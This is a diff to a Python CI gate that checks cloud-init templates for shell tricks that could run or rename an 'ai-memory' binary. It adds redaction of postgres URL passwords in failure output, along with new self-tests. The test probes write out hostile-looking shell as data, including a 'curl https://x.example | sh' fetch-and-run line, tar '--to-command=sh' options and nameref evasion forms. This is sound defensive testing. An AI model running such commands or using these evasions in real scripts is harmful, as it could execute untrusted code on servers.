@@ -832,7 +832,7 @@ def value_word_problem(w: str):
         why = "a tilde expansion"
     else:
         why = "a word outside the grammar [%s] / one double-quoted word of those and $NAME" % LITERAL_CLASS
-    return "%s in %r" % (why, w[:40])
+    return "%s in %r" % (why, scrub(w)[:40])
 
 
 # ---------------------------------------------------------------- #4837 R12: R4 operands
@@ -1070,7 +1070,7 @@ def bare_operand_problem(words: list, idx, bins):
         name = None if m is None else (m.group(1) or m.group(2))
         if name is None or (name not in resolved and name not in bins):
             return ("%r is an operand of %r whose value the gate cannot read (an unresolved expansion may "
-                    "name the ai-memory binary)" % (w[:40], base))
+                    "name the ai-memory binary)" % (scrub(w)[:40], base))
     return None
 
 
@@ -1133,7 +1133,7 @@ def copy_problem(base: str, args: list, bins):
         return None
     dest = unquote(ops[-1])[0]
     if any(binary_ref(src, bins) for src in ops[:-1]) and not dest.endswith("/") and posixpath.basename(dest) != "ai-memory":
-        return "%s copies the ai-memory binary to another name %r (the gate finds the binary by its name)" % (base, ops[-1][:40])
+        return "%s copies the ai-memory binary to another name %r (the gate finds the binary by its name)" % (base, scrub(ops[-1])[:40])
     return None
 
 
@@ -1157,7 +1157,7 @@ def operand_problem(words: list, idx, bins):
         if risky is not None:
             # the archive's members are not visible here: a program option or a rename is
             # red whatever the operands name (#5093)
-            return "tar option %r runs a program or renames members (the gate finds the binary by its name)" % risky[:40]
+            return "tar option %r runs a program or renames members (the gate finds the binary by its name)" % scrub(risky)[:40]
     if base == "find" and any(unquote(a)[0] in FIND_EXEC_ACTIONS for a in words[idx + 1:]):
         return "find runs a command per file (its operands come from the file system, so a copy's name is not readable)"
     if base in COPY_CMDS and any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
@@ -1174,7 +1174,7 @@ def operand_problem(words: list, idx, bins):
         return None
     lead = " ".join(words[:refs[0]])
     return ("ai-memory is run by or an operand of %r: unknown wrapper (only NAME=value prefixes, %s and the "
-            "non-executing %s are understood)" % (lead[:60], "/".join(sorted(WRAPPERS)), "/".join(sorted(KNOWN_NONEXEC))))
+            "non-executing %s are understood)" % (scrub(lead)[:60], "/".join(sorted(WRAPPERS)), "/".join(sorted(KNOWN_NONEXEC))))
 
 
 # ---------------------------------------------------------------- #4837 R12: R5 data files
@@ -1642,12 +1642,12 @@ def companion_hits(stmt: str, st: dict, depth: int = 0, bins=frozenset()) -> lis
             cw = cw.replace(TF_VALUE, "TFVALUE")
         val, exp = unquote(cw)
         if exp or "$" in cw or "`" in cw:
-            out.append("command word %r is an expansion or command substitution" % cw[:40])
+            out.append("command word %r is an expansion or command substitution" % scrub(cw)[:40])
             continue
         base = posixpath.basename(val)
         args = words[idx + 1:]
         if not st.get("data") and val not in ("[", "[[") and re.search(r"[*?\[]", val):
-            out.append("command word %r is a glob (the command is chosen at run time)" % cw[:40])
+            out.append("command word %r is a glob (the command is chosen at run time)" % scrub(cw)[:40])
             continue
         if base == "case":
             st["case"] = st.get("case", 0) + 1
@@ -1695,7 +1695,7 @@ def companion_hits(stmt: str, st: dict, depth: int = 0, bins=frozenset()) -> lis
                     continue
                 if want_value is None or not FLAG_WORD_RE.match(rw.split("=", 1)[0]) or rw == "-":
                     if not BARE_LITERAL_RE.match(rw):
-                        out.append("ai-memory subcommand %r is not a bare literal word" % rw[:40])
+                        out.append("ai-memory subcommand %r is not a bare literal word" % scrub(rw)[:40])
                     break
                 if "=" in rw:
                     why = value_word_problem(rw.split("=", 1)[1])
@@ -1717,7 +1717,7 @@ def companion_hits(stmt: str, st: dict, depth: int = 0, bins=frozenset()) -> lis
                 else:
                     sval, sexp = unquote(sw)
                     if sexp:
-                        out.append("expanded %s -c script %r" % (base, sw[:40]))
+                        out.append("expanded %s -c script %r" % (base, scrub(sw)[:40]))
                     elif is_shell:
                         out.extend(companion_hits(sval, {}, depth + 1, bins))
             elif pipe_in:
@@ -1898,7 +1898,7 @@ def parse_template(name: str, text: str, info=None):
         if ind == 0:
             m = re.match(r"^([A-Za-z_][\w-]*):(.*)$", s)
             if m is None:
-                hits.append("%s:%d: top-level line is not a 'key:' (%r)" % (name, i + 1, s[:40]))
+                hits.append("%s:%d: top-level line is not a 'key:' (%r)" % (name, i + 1, scrub(s)[:40]))
                 top = "?"
             else:
                 top = m.group(1)
@@ -1929,7 +1929,7 @@ def parse_template(name: str, text: str, info=None):
                 cur_path = "?"
             km = re.match(r"^([A-Za-z_]\w*):(.*)$", s)
             if km is None:
-                hits.append("%s:%d: write_files line is neither '- path:' nor a 'key:' of the entry (%r)" % (name, i + 1, s[:40]))
+                hits.append("%s:%d: write_files line is neither '- path:' nor a 'key:' of the entry (%r)" % (name, i + 1, scrub(s)[:40]))
             elif key_ind is not None and ind != key_ind:
                 hits.append("%s:%d: write_files key at indent %d, the entry's keys are at %d" % (name, i + 1, ind, key_ind))
             if km is not None and cur_path in entries:
@@ -1938,7 +1938,7 @@ def parse_template(name: str, text: str, info=None):
             sq = scan_quotes(s, None)
             if km is not None and km.group(1) == "content":
                 if km.group(2).strip() not in ("|", "|-", "|+"):
-                    hits.append("%s:%d: write_files content must be a literal block (content: |), got %r" % (name, i + 1, km.group(2).strip()[:20]))
+                    hits.append("%s:%d: write_files content must be a literal block (content: |), got %r" % (name, i + 1, scrub(km.group(2).strip())[:20]))
                     i += 1
                     continue
                 j = i + 1
@@ -2152,6 +2152,26 @@ def dsn_problems(dsn: str, ctx: str) -> list:
 
 def redact(dsn: str) -> str:
     return re.sub(r"//[^@/]*@", "//<userinfo>@", dsn)[:70]
+
+
+# a postgres URL up to its last "@" (a password can hold "/" or "@"), and a URL cut before
+# its "@" that still holds "user:password": both are userinfo, never printed (#5438)
+SCRUB_UPTO_AT = re.compile(r"(postgres(?:ql)?://)[^\s\"']*@", re.I)
+SCRUB_CUT = re.compile(r"(postgres(?:ql)?://)[^\s\"'/@]*:[^\s\"'/@]*(?=[\s\"']|$)", re.I)
+
+
+def scrub(text: str) -> str:
+    """Text safe to print: the userinfo of every postgres URL in it is replaced (#5438).
+    The only password the gate tolerates is the store-url placeholder, but a template can
+    carry a real one, and a failure line that quotes the line or a word cut from it would
+    put that password in the CI log. Applied to every hit before it is printed, and
+    before any cut to a fixed width, so a cut cannot drop the "@" that marks the userinfo."""
+    return SCRUB_CUT.sub(r"\1<userinfo>", SCRUB_UPTO_AT.sub(r"\1<userinfo>@", text))
+
+
+def printable(lines, prefix: str = "") -> str:
+    """The text main() prints for hits or faults: every line scrubbed (#5438)."""
+    return "\n".join(prefix + scrub(x) for x in lines)
 
 
 def validate_line(ln: Line, homes: set, binaries: set) -> list:
@@ -2630,7 +2650,16 @@ def binary_vars(stmts: list) -> frozenset:
 def analyse(name: str, text: str, cache: dict):
     key = (name, text)
     if key not in cache:
-        lines, hits, entries, stmts = classify(name, text)
+        # the R5 reasons this scan adds are kept with the entry, so a scan answered from
+        # the cache puts them back (#5439)
+        saved = dict(R5_READ_AS_SCRIPT)
+        R5_READ_AS_SCRIPT.clear()
+        try:
+            lines, hits, entries, stmts = classify(name, text)
+            cache[("r5",) + key] = dict(R5_READ_AS_SCRIPT)
+        finally:
+            R5_READ_AS_SCRIPT.clear()
+            R5_READ_AS_SCRIPT.update(saved)
         bins = binary_vars(stmts)
         comp = []
         for where, stmt, st in stmts:
@@ -2653,6 +2682,8 @@ def analyse(name: str, text: str, cache: dict):
         homes = service_homes(lines)
         trig = [ln for ln in lines if triggered(ln)]
         cache[key] = (lines, hits + comp, entries, trig, homes)
+    for path, use in cache[("r5",) + key].items():
+        R5_READ_AS_SCRIPT.setdefault(path, use)
     return cache[key]
 
 
@@ -2678,7 +2709,7 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
         k = (e[0], e[2], e[3])
         clash = [x for x in ((k,) + tuple((sc, e[2], e[3]) for sc in SCOPES if (sc == "both") != (e[0] == "both"))) if x in seen]
         if clash and (clash[0] != k or e[1] or seen[k].startswith("pending")):
-            faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], e[3][:50], seen[clash[0]]))
+            faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], scrub(e[3])[:50], seen[clash[0]]))
         seen[k] = "%s:%d" % ("pending" if e[1] else "allow", e[4])
     approved = {(e[0], e[2], e[3]) for e in allow}
     pending = {(e[0], e[2], e[3]) for e in pend}
@@ -2717,7 +2748,7 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
                     approved.add(keys[0])
                     hit_a = keys[0]
                 else:
-                    hits.append("%s:%d: line not in the allowlist: %s | %s | %s" % (nm, ln.first, sc, ln.ctx, ln.text[:160]))
+                    hits.append("%s:%d: line not in the allowlist: %s | %s | %s" % (nm, ln.first, sc, ln.ctx, scrub(ln.text)[:160]))
                     continue
             k = hit_a or hit_p
             used.setdefault(k, set()).add(sc)
@@ -2730,7 +2761,7 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
         got = used.get(k, set())
         if not need <= got:
             what = "pending" if e[1] else "allow"
-            hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], e[3][:80]))
+            hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], scrub(e[3])[:80]))
     for key in sorted(set(expected) | set(actual)):
         if key[0] not in scopes or autolist:
             continue
@@ -2738,7 +2769,7 @@ def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str,
         if want != got:
             k = next((i for i, (x, y) in enumerate(zip(want, got)) if x != y), min(len(want), len(got)))
             hits.append("%s | %s: triggered lines differ from the allowlist order at item %d (allow %d, template %d): allow=%r template=%r"
-                        % (key[0], key[1], k + 1, len(want), len(got), (want[k:k + 1] or [""])[0][:70], (got[k:k + 1] or [""])[0][:70]))
+                        % (key[0], key[1], k + 1, len(want), len(got), scrub((want[k:k + 1] or [""])[0])[:70], scrub((got[k:k + 1] or [""])[0])[:70]))
     stats = {"templates": len(templates), "allow": len(allow), "pending": len(pend), "triggered": ntrig}
     return hits, faults, stats
 
@@ -3086,6 +3117,8 @@ def build_probes() -> list:
         ('tar options from mapfile into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; mapfile -t "$${N}IONS" < /dev/null; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
         ('tar options from getopts into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; getopts x "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
         ('nameref whose target is built from an expansion, alone, listed (#4837 R12 R4, #5326)', [(dec, '      T=X; declare -n R="$T"\n' + dec)]),
+        ('tar options from printf -v attached to a name built from an expansion, listed (#4837 R12 R4, #5444)', [(dec, '      printf -vTAR_$T %s --to-command=sh\n' + dec)]),
+        ('tar options from printf -v attached to a quoted name built from an expansion, listed (#4837 R12 R4, #5444)', [(dec, '      printf -v"TAR_$T" %s x\n' + dec)]),
         ('binary assigned as a one-element array, then run behind taskset, listed (#4837 R12 R4, #5330)', [(dec, "      A=(/usr/local/lib/ai-memory/bin/ai-memory); taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
         ('binary written through a nameref whose target is built from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R=\"$T\"; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
         ('binary written through a nameref whose target is assigned from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R; R=$T; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
@@ -3218,7 +3251,6 @@ def build_probes() -> list:
     red("R3-C listed data home run by run-parts is an R5 hit, not an R4 wrapper (#4998)",
         [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
         autolist=True, present="is an expansion or command substitution")
-    # a name read from input has no known value: its literal assignments are not expanded (#5095 pin, #5100)
     # a name read from input keeps every literal it is assigned: the read may run after
     # the use, may not run, or may run in a pipeline subshell, so this #5100 green form is
     # red now (#5356, 5-agent vote 4d3ea1c5)
@@ -3228,6 +3260,9 @@ def build_probes() -> list:
     red('data-home file copied after a read in a pipeline subshell, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-memory/r; P+=un.conf; echo x | read P; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
     green('data-home file kept as data next to a read into a name that never held a data-home path (#5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/srv/x; read P < /dev/null; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
     green("data-home file kept as data next to split and appended names that do not name it (#5356)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/var/r; F+="un.conf /x"; cp $F /usr/local/bin/; IFS=:; G=x:/var/r; G+=u*; cp $G /usr/local/bin/\n' + dec)], autolist=True)
+    # the second name of a declare -n is a nameref: a value built from an expansion that is
+    # assigned to it is refused for its own reason, not only through the unrelated glob hit (#5324, #5445)
+    red('nameref declared with a second name, then assigned a value built from an expansion, listed (#5324, #5445)', [(dec, '      declare -n A=X B; B=TAR_$T\n' + dec)], autolist=True, present="nameref target built from an expansion")
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
@@ -3401,7 +3436,7 @@ def entry_mutations(base: tuple, cache: dict) -> list:
             tf_seen[nm] = k + 1
             spans = tf_region_spans(templates[nm])
             if k >= len(spans) or tf_regions(templates[nm])[k] != line:
-                raise RuntimeError("self-test: tf-region entry %d matches no region in order: %s" % (k + 1, raw[:80]))
+                raise RuntimeError("self-test: tf-region entry %d matches no region in order: %s" % (k + 1, scrub(raw)[:80]))
             phys = templates[nm].split("\n")
             a, b = spans[k]
             body = [x for x in range(a, b + 1) if DIRECTIVE_LINE_RE.match(phys[x]) is None]
@@ -3422,9 +3457,115 @@ def entry_mutations(base: tuple, cache: dict) -> list:
 def probe_failure(label: str, expect: str, got: str, found: list) -> str:
     """The self-test line for a probe with the wrong verdict: the hit count and up to 3
     hits whole, so the line names why the probe went red (#5385)."""
-    shown = "".join("\n    " + h for h in found[:3])
+    shown = "".join("\n    " + scrub(h) for h in found[:3])
     more = "\n    ... %d more" % (len(found) - 3) if len(found) > 3 else ""
     return "%s: expected %s, got %s (%d hits)%s%s" % (label, expect, got, len(found), shown, more)
+
+
+SCRUB_CASES = [
+    ("postgres://u:pw@h/db", "postgres://<userinfo>@h/db"),
+    ("postgres://u:p/w@h/db", "postgres://<userinfo>@h/db"),
+    ("postgresql://u:p@w@h/db", "postgresql://<userinfo>@h/db"),
+    ("POSTGRES://u:pw@h/db", "POSTGRES://<userinfo>@h/db"),
+    ("'postgres://aimemory:Cut'", "'postgres://<userinfo>'"),
+    ("postgres://localhost/db?sslmode=verify-full", "postgres://localhost/db?sslmode=verify-full"),
+]
+
+
+def secret_output_problems(base: tuple, known: set) -> list:
+    """Failure output holds no password (#5438): a store-url password plus one nameref
+    makes rule R5 read the store-url file as script, and the hits that quote its line or a
+    word cut from it must print no password byte, in main() or in a self-test failure."""
+    bad = []
+    for raw, want in SCRUB_CASES:
+        if scrub(raw) != want:
+            bad.append("scrub(%r) gave %r, not %r" % (raw, scrub(raw), want))
+    dec = "      systemctl daemon-reload\n"
+    nameref = "      A=/etc/ai-memory/run.conf; declare -n R=A; bash \"$R\"\n"
+    for pw in ("SecretMark9xyz", "Secret/Mark9/xyz/Secret/Mark9/xyz/Secret/Mark9/xyz", "Secret$Mark9$xyz$Secret$Mark9$xyz", "Secret/Mark9/" * 20):
+        spec = {"aws": [("aimemory:CHANGEME@", "aimemory:%s@" % pw), (dec, nameref + dec)]}
+        t, mt, a, p, auto, extra = case_inputs(base, spec)
+        hits, faults, _ = run_scan(t, mt, a, p, known, cache={})
+        out = printable(faults, "FAULT: ") + "\n" + printable(hits) + "\n" + probe_failure("p", "green", "red", faults + hits)
+        if not hits:
+            bad.append("a store-url password with a nameref was not refused (%r)" % pw[:12])
+        if "Mark9" in out:
+            bad.append("failure output carries a store-url password (%r)" % pw[:12])
+    # the expansion hit cuts the command word at 40 bytes: scrub first, or the cut drops the @
+    spec = {"aws": [(dec, "      postgres://aimemory:ExpMark9xyzExpMark9xyzExpMark9xyz@h/$X a\n" + dec)]}
+    t, mt, a, p, auto, extra = case_inputs(base, spec)
+    hits, faults, _ = run_scan(t, mt, a, p, known, cache={})
+    if not any("expansion or command substitution" in h for h in hits):
+        bad.append("an expanded command word that quotes a store url was not refused")
+    if "ExpMark9" in "\n".join(faults + hits):
+        bad.append("an expansion hit carries a store-url password")
+    # main() itself prints through printable: stub the scan so that its hit and fault both
+    # quote a password, and read what reaches stderr (a fault path and a hit path)
+    scan_real, load_real = globals()["run_scan"], globals()["load_repo"]
+    quoted = ["x: command word 'postgres://aimemory:MainMark9xyz@localhost' is a glob"]
+    try:
+        globals()["load_repo"] = lambda: ({}, {}, "", "")
+        for faults_in in ([], ["FAULT quoted postgres://aimemory:MainMark9xyz@localhost"]):
+            globals()["run_scan"] = lambda *a, _f=faults_in, **k: (quoted, _f, {})
+            err = io.StringIO()
+            with contextlib.redirect_stderr(err):
+                rc = main(["check"])
+            if rc not in (1, 2) or "MainMark9" in err.getvalue() or "<userinfo>" not in err.getvalue():
+                bad.append("main() printed a store-url password or no redaction (rc %r)" % rc)
+        # the exception path of main() and probe_failure on a raw hit (#5438)
+        def boom():
+            raise RuntimeError("bad postgres://aimemory:ExcMark9xyz@localhost")
+        globals()["load_repo"] = boom
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            rc = main(["check"])
+        if rc != 2 or "ExcMark9" in err.getvalue() or "<userinfo>" not in err.getvalue():
+            bad.append("main() exception path printed a store-url password (rc %r)" % rc)
+    finally:
+        globals()["run_scan"], globals()["load_repo"] = scan_real, load_real
+    if "PfMark9" in probe_failure("p", "green", "red", ["x postgres://aimemory:PfMark9xyz@localhost"]):
+        bad.append("probe_failure printed a store-url password")
+    return bad
+
+
+def r5_cache_problems(base: tuple, known: set) -> list:
+    """A scan answered from the cache keeps the R5 reason (#5439)."""
+    dec = "      systemctl daemon-reload\n"
+    spec = {"aws": [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      foo /\n" + dec)], "autolist": True}
+    t, mt, a, p, auto, extra = case_inputs(base, spec)
+    cache, seen = {}, []
+    for _ in range(2):
+        R5_READ_AS_SCRIPT.clear()
+        run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
+        seen.append(dict(R5_READ_AS_SCRIPT))
+    if not seen[0].get("/etc/ai-memory/run.conf") or seen[0] != seen[1]:
+        return ["the R5 reason is lost or differs when a scan is answered from the cache: %r then %r" % tuple(seen)]
+    return []
+
+
+def pin_problems() -> list:
+    """Direct pins for checks a verdict-level probe cannot reach (#5324, #5100, #5329, #5446)."""
+    bad = []
+    # every name word of a declare -n is a nameref (#5324)
+    if not {"A", "B", "X"} <= nameref_facts(["declare -n A=X B"])[0]:
+        bad.append("nameref_facts did not record every name word of a declare -n")
+    # -- ends the option words, and an expanded option word can be -n (#5323)
+    if nameref_facts(["declare -- $X=1"]) != (set(), False):
+        bad.append("nameref_facts did not stop at -- before a name word")
+    if not nameref_facts(["declare -$X R=A"])[1]:
+        bad.append("nameref_facts did not poison an expanded option word")
+    # the fields of a split name are in its value set (IFS cut, #5100)
+    if not {"x", "/var/r"} <= var_values([("w", "IFS=:; G=x:/var/r; cp $G /usr/local/bin/", {})]).get("G", set()):
+        bad.append("var_values did not cut a split name on IFS")
+    # an IFS the gate cannot read leaves a split name standing for any text (#5100)
+    if var_values([("w", "IFS=$X; G=a:b; cp $G /x", {})]).get("G") != {VALUES_PAST_CAP}:
+        bad.append("var_values did not collapse a split name under an IFS it cannot read")
+    # no value set is kept past EXPAND_CAP: the cap, not only that one exists (#5329)
+    for n in range(1, EXPAND_CAP.bit_length() + 3):
+        vals = var_values([("w", "F+=a", {})] * n).get("F", set())
+        if vals != {VALUES_PAST_CAP} and len(vals) > EXPAND_CAP:
+            bad.append("an append chain of %d kept %d values, past EXPAND_CAP" % (n, len(vals)))
+    return bad
 
 
 def self_test(known: set) -> int:
@@ -3459,6 +3600,9 @@ def self_test(known: set) -> int:
     long_hit = "x" * 150 + " the reason"
     if long_hit not in probe_failure("p", "green", "red", ["a", long_hit, "b", "c"]):
         bad.append("a probe failure line cut a hit")
+    bad.extend(r5_cache_problems(base, known))
+    bad.extend(pin_problems())
+    bad.extend(secret_output_problems(base, known))
     with contextlib.redirect_stderr(io.StringIO()):
         try:
             build_parser().parse_args(["--bogus"])
@@ -3467,7 +3611,7 @@ def self_test(known: set) -> int:
             if exc.code != 2:
                 bad.append("a mistyped argument exited %r, not 2" % exc.code)
     if bad:
-        print("\n".join("SELF-TEST FAIL: " + b for b in bad), file=sys.stderr)
+        print(printable(bad, "SELF-TEST FAIL: "), file=sys.stderr)
         return 1
     print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, append chain past the cap collapses, mistyped argument exits 2"
           % (counts["red"], counts["green"], counts["fault"], len(muts), len(muts)))
@@ -3486,15 +3630,15 @@ def main(argv: list) -> int:
             return 0
         hits, faults, stats = run_scan(templates, maintfs, allow, pend, known)
     except (OSError, RuntimeError, UnicodeDecodeError) as exc:
-        print("FAULT: %s" % exc, file=sys.stderr)
+        print("FAULT: %s" % scrub(str(exc)), file=sys.stderr)
         return 2
     if faults:
-        print("\n".join("FAULT: " + f for f in faults), file=sys.stderr)
+        print(printable(faults, "FAULT: "), file=sys.stderr)
         if hits:
-            print("\n".join(hits), file=sys.stderr)
+            print(printable(hits), file=sys.stderr)
         return 2
     if hits:
-        print("\n".join(hits), file=sys.stderr)
+        print(printable(hits), file=sys.stderr)
         print("FAIL: %d cloud-init template defect(s)" % len(hits), file=sys.stderr)
         print("  list the changed approved lines: scripts/regen-cloud-init-token-allow.py <repo-root>; after review, rerun it with --accept-new and review its diff", file=sys.stderr)
         return 1
